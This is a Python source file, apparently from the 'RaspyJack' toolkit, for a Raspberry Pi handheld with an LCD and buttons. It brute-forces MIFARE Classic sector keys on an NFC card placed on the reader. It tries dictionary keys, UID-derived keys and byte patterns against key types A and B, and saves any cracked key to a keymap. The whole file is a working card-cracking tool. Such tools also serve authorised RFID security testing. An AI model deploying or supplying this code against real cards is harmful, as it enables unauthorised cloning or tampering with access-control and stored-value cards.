#!/usr/bin/env python3
"""
RaspyJack Payload -- NFC Key Brute-force
==========================================
Advanced brute-force beyond dictionary: UID-derived keys, patterns, incremental.

Controls:
  OK         Start / Select sector
  UP/DOWN    Choose sector / phase
  KEY3       Stop / Exit
"""
import os, sys, time
sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads.nfc_rfid._nfc_driver import auto_detect, is_classic
from payloads.nfc_rfid._nfc_keys import KNOWN_KEYS, save_keymap

PINS = {"UP":6,"DOWN":19,"LEFT":5,"RIGHT":26,"OK":13,"KEY1":21,"KEY2":20,"KEY3":16}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
DEBOUNCE = 0.18
_last_btn = 0

def _btn():
    global _last_btn
    b = get_button(PINS, GPIO)
    now = time.time()
    if b and now - _last_btn < DEBOUNCE: return None
    if b: _last_btn = now
    return b

def _uid_derived_keys(uid):
    """Generate keys derived from UID."""
    keys = []
    uh = uid.hex()
    # UID padded/repeated
    if len(uid) == 4:
        keys.append(uid + uid[:2])
        keys.append(uid[::-1] + uid[:2])
        keys.append(bytes([uid[0]^0xFF, uid[1]^0xFF, uid[2]^0xFF, uid[3]^0xFF, uid[0], uid[1]]))
    # XOR patterns
    for xor_val in [0x00, 0xFF, 0xAA, 0x55]:
        keys.append(bytes([b ^ xor_val for b in uid[:6]]).ljust(6, b"\x00")[:6])
    return keys

def _pattern_keys():
    """Generate pattern-based keys."""
    keys = []
    for b in range(256):
        keys.append(bytes([b] * 6))
    for i in range(6):
        k = [0] * 6
        k[i] = 0xFF
        keys.append(bytes(k))
    return keys

def main():
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font(10)
    font_sm = scaled_font(9)

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 50), "Detecting reader...", font=font_sm, fill="#FFAA00")
    lcd.LCD_ShowImage(img, 0, 0)
    drv, drv_desc = auto_detect()
    status = drv_desc if drv else "No reader"
    card = None
    target_sector = 0
    found_key = None
    running = False

    try:
        while True:
            btn = _btn()
            if btn == "KEY3":
                if running:
                    running = False
                else:
                    break
            if btn == "UP" and not running:
                target_sector = (target_sector - 1) % 16
            if btn == "DOWN" and not running:
                target_sector = (target_sector + 1) % 16

            if btn == "OK" and drv and not running:
                if not card:
                    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                    d = ScaledDraw(img)
                    d.text((4, 50), "Place card...", font=font_sm, fill="#FFAA00")
                    lcd.LCD_ShowImage(img, 0, 0)
                    card = drv.read_passive_target(timeout=5.0)
                    if not card or not is_classic(card):
                        status = "Not Classic" if card else "No card"
                        card = None
                        continue
                    status = f"Card: {card.uid_hex[:8]}"
                    continue

                # Start brute-force
                running = True
                found_key = None
                block = target_sector * 4
                uid = card.uid
                phases = [
                    ("Dictionary", KNOWN_KEYS),
                    ("UID-derived", _uid_derived_keys(uid)),
                    ("Patterns", _pattern_keys()),
                ]
                total_keys = sum(len(p[1]) for p in phases)
                tested = 0
                start_time = time.time()

                for phase_name, keys in phases:
                    if not running: break
                    for key in keys:
                        if not running: break
                        tested += 1
                        if tested % 5 == 0:
                            elapsed = time.time() - start_time
                            speed = tested / max(0.1, elapsed)
                            eta = int((total_keys - tested) / max(1, speed))
                            pct = tested * 100 // total_keys

                            img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                            d = ScaledDraw(img)
                            d.rectangle((0, 0, 127, 14), fill="#111")
                            d.text((2, 2), "BRUTE-FORCE", font=font_sm, fill="#FF4444")
                            d.text((90, 2), f"{pct}%", font=font_sm, fill="#FF4444")
                            d.text((4, 20), f"Sector {target_sector} - {phase_name}", font=font_sm, fill="#FFAA00")
                            d.rectangle((4, 36, 123, 44), outline="#333")
                            bw = max(1, int(119 * tested / max(1, total_keys)))
                            d.rectangle((4, 36, 4 + bw, 44), fill="#FF4444")
                            d.text((4, 50), f"Key: {key.hex().upper()}", font=font_sm, fill="#ccc")
                            d.text((4, 65), f"{speed:.0f} keys/sec", font=font_sm, fill="#888")
                            d.text((4, 78), f"ETA: {eta}s ({tested}/{total_keys})", font=font_sm, fill="#888")
                            d.text((4, 95), "KEY3 to stop", font=font_sm, fill="#555")
                            lcd.LCD_ShowImage(img, 0, 0)

                            b2 = _btn()
                            if b2 == "KEY3":
                                running = False
                                break

                        for kt in [0x60, 0x61]:
                            if drv.mifare_auth(block, key, uid, kt):
                                found_key = (key, kt)
                                running = False
                                break
                        if found_key: break
                    if found_key: break

                running = False
                elapsed = int(time.time() - start_time)
                if found_key:
                    k, kt = found_key
                    kt_name = "A" if kt == 0x60 else "B"
                    status = f"FOUND! Key{kt_name}: {k.hex().upper()}"
                    save_keymap(card.uid_hex, [{"sector": target_sector, "key": k.hex().upper(), "key_type": kt_name, "cracked": True}])
                else:
                    status = f"Not found ({tested} keys, {elapsed}s)"

            # Draw
            if not running:
                img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                d = ScaledDraw(img)
                d.rectangle((0, 0, 127, 14), fill="#111")
                d.text((2, 2), "NFC BRUTE", font=font_sm, fill="#FF4444")
                y = 20
                d.text((4, y), status[:24], font=font_sm, fill="#FFAA00"); y += 13
                if card:
                    d.text((4, y), f"UID: {card.uid_hex}", font=font_sm, fill="#00FF00"); y += 13
                    d.text((4, y), f"Target: Sector {target_sector}", font=font, fill="#ccc"); y += 15
                    d.text((4, y), "UP/DOWN: sector", font=font_sm, fill="#888"); y += 12
                    d.text((4, y), "OK: start brute-force", font=font_sm, fill="#888")
                    if found_key:
                        y += 15
                        k, kt = found_key
                        d.text((4, y), f"Key: {k.hex().upper()}", font=font, fill="#00FF00")
                else:
                    d.text((4, 50), "Press OK to scan card", font=font_sm, fill="#666")

                d.rectangle((0, 116, 127, 127), fill="#111")
                d.text((2, 117), "OK:Start KEY3:Exit", font=font_sm, fill="#666")
                lcd.LCD_ShowImage(img, 0, 0)
            time.sleep(0.03)
    finally:
        if drv: drv.close()
        try: lcd.LCD_Clear()
        except: pass
        GPIO.cleanup()
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
